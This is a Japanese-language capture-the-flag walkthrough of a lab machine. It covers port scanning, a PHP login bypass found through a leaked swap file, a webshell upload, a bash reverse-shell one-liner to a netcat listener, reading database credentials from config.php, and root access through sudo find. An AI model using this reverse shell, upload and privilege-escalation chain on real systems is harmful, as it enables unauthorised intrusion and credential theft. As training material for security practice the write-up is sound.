4,# 1.Port Scan 
対象マシンのポートをスキャン
ip=10.129.95.184

`nmap -sV -sC $ip`

![dd33300f97dcf6df4b43a40ea90dc30b.png](../_resources/dd33300f97dcf6df4b43a40ea90dc30b.png)

スキャンしたHPにアクセスする

http://$ip

![ba7a54a06bae687f6ee0b21a301652d0.png](../_resources/ba7a54a06bae687f6ee0b21a301652d0.png)

Loginページを発見。

![b88bcc78934faab9a7d5768aaf375c95.png](../_resources/b88bcc78934faab9a7d5768aaf375c95.png)

login.php.swpを取得

`http://$ip/login/`

![1caf516eb0a748277fa81a85c765e045.png](../_resources/1caf516eb0a748277fa81a85c765e045.png)

ダウンロードしたlogin.php.swpを確認

`strings login.php.swp`

![ff55987b521462936e8a409aa6147819.png](../_resources/ff55987b521462936e8a409aa6147819.png)

tacコマンドで逆順に表示

片方がarrayなら条件に一致

`strings login.php.swp >> file.txt`

`tac file.txt` 

![cdeebd4405363303a76f0ae5b4f006d3.png](../_resources/cdeebd4405363303a76f0ae5b4f006d3.png)

# 2. Burpsuite

arrayに加工

![60935d983e1d46920fdf3f5baeec49df.png](../_resources/60935d983e1d46920fdf3f5baeec49df.png)

usernameとpasswordを修正

![77d19fe25e27c98937a9167e466c2ac8.png](../_resources/77d19fe25e27c98937a9167e466c2ac8.png)

ログイン成功

![99caefb61dca0c927b38e3aafcb11aa2.png](../_resources/99caefb61dca0c927b38e3aafcb11aa2.png)

HPへアクセス

![36c23cc1bfb0cdf82eee6b1e1bb56301.png](../_resources/36c23cc1bfb0cdf82eee6b1e1bb56301.png)

# 3. Reverse shell

テスト用のphpファイルの作成

`echo "<?php phpinfo(); ?>" > test.php`

![b333597232ffc3bb3168ae5983a707ed.png](../_resources/b333597232ffc3bb3168ae5983a707ed.png)

test.phpをアップロード

![4795044368ee555b25866ea39880ce11.png](../_resources/4795044368ee555b25866ea39880ce11.png)

`gobuster dir --url http://$ip/ --wordlist /usr/share/wordlists/dirb/big.txt`

gobusterを使い、アップロード先と推測される_uploadedディレクトリを発見

![71215a93c86f5a372ab1c50a89364f10.png](../_resources/71215a93c86f5a372ab1c50a89364f10.png)

アップロードしたtest.phpを確認

![730ae8e3d2b6b1895eae24df1fbf0b5a.png](../_resources/730ae8e3d2b6b1895eae24df1fbf0b5a.png)

アップロードしたtest.phpへアクセス
phpinfoが実行されている

![f9d39c59731445b71249713837192431.png](../_resources/f9d39c59731445b71249713837192431.png)

webshellを作成し、アップロードする

![dfb038b6938d6506ebfb67f346d23b48.png](../_resources/dfb038b6938d6506ebfb67f346d23b48.png)

webshell.phpを確認

![822a02ecf30ddcc14ba001a45cdb4a48.png](../_resources/822a02ecf30ddcc14ba001a45cdb4a48.png)

アクセスしたが空白

![7f4e3aa0e7e20970b2e71a3f85118dde.png](../_resources/7f4e3aa0e7e20970b2e71a3f85118dde.png)

URLを修正

http://$ip/_uploaded/shell.php/?cmd=id

![13188007128c90366253be295418b9af.png](../_resources/13188007128c90366253be295418b9af.png)

burpusuiteでinterseputを実行

![1aeef26121812d2ae75a12fa12deaa40.png](../_resources/1aeef26121812d2ae75a12fa12deaa40.png)

Repeaterに送る

![0de95549e1b86551e4d71764590628dc.png](../_resources/0de95549e1b86551e4d71764590628dc.png)

request methodを変更

![fd30fc38681018e0a1888c09fd5fe8b6.png](../_resources/fd30fc38681018e0a1888c09fd5fe8b6.png)

reverse shellを挿入

`cmd=/bin/bash -c 'bash -i >& /dev/tcp/$ip/12345 0>&1'`

![ec278acaf0994b56347c4d69c1fb6d58.png](../_resources/ec278acaf0994b56347c4d69c1fb6d58.png)

URLが理解できるようにエンコード

![5f3e67797cebe009323fb46121c3456f.png](../_resources/5f3e67797cebe009323fb46121c3456f.png)

# 4.Web Connect

ローカルサーバを立てる

`sudo nc -lnvp 12345` 

![fafc146a3d4a484e9309d057bc150282.png](../_resources/fafc146a3d4a484e9309d057bc150282.png)

reverseshellを実行

![9ba136a34dcf757881d3a45f47323066.png](../_resources/9ba136a34dcf757881d3a45f47323066.png)

user.txtを発見したが、
管理者権限が足りない

`cd /home/john`

`cat user.txt`

![42b7177b91d4b93b82001be9bf23d6e4.png](../_resources/42b7177b91d4b93b82001be9bf23d6e4.png)

webの場合/var/www/htmlにユーザ情報がある場合が多い
確認した結果、ユーザ情報を発見

`locate config.php`

`cd  /var/www/html/login/`

`cat config.php`

![075b93157a693e6a8f35a478b92f0b17.png](../_resources/075b93157a693e6a8f35a478b92f0b17.png)

# 5.Flag get

adminユーザでssh接続を試すが拒否される

![aedfe1a0a0d7530ff34da11c22cf96f4.png](../_resources/aedfe1a0a0d7530ff34da11c22cf96f4.png)

試しにjohnユーザで実行


![494a98419df421b52032e87b392ecc89.png](../_resources/494a98419df421b52032e87b392ecc89.png)

ログイン成功

![9ab47a49380da44d89d4ee8bc3196589.png](../_resources/9ab47a49380da44d89d4ee8bc3196589.png)

ユーザ情報を確認
user/bin/findをroot権限で実行できる事を確認

![6b0d398f9e8f1c3892aaebb076068c52.png](../_resources/6b0d398f9e8f1c3892aaebb076068c52.png)

webサイト「GTFOBins」で検索した結果
findからrootになるコマンドを発見

![7928c0c7eaf41dbc3d4349895983ef45.png](../_resources/7928c0c7eaf41dbc3d4349895983ef45.png)

![4ae66a80d2c085ebd6beb423033752c1.png](../_resources/4ae66a80d2c085ebd6beb423033752c1.png)

コマンドを実行。root権限を取得
root.txtとuser.txtを取得

`sudo find . -exec /bin/sh \; -quit`

`pwd`

`locate root.txt`

`cd /root`

`cat root.txt`

![ebb29a44455be23ef5a2b2c8314770e3.png](../_resources/ebb29a44455be23ef5a2b2c8314770e3.png)